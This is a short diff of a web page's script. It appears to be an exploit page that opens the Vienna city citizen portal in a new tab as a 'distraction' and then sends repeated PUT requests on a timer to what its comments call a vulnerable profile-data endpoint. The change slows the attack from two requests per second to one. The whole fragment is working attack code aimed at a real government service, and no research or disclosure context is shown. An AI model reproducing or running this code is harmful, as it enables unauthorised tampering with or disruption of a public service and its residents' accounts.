@@ -19,7 +19,7 @@
                 // Open target site in new tab (distraction)
                 open('https://mein.wien.gv.at/Mein-Profil');
                 
-                // Start attacking at 2 requests per second
+                // Start attacking at 1 request per second
                 attackInterval = setInterval(() => {
                     // Send PUT request to vulnerable endpoint
                     fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
@@ -98,7 +98,7 @@
                         document.getElementById('response').innerHTML = 
                             'Error - Continuing attack...';
                     });
-                }, 500);
+                }, 1000); // Changed from 500 to 1000 (1 request per second)
             }
         });
     </script>
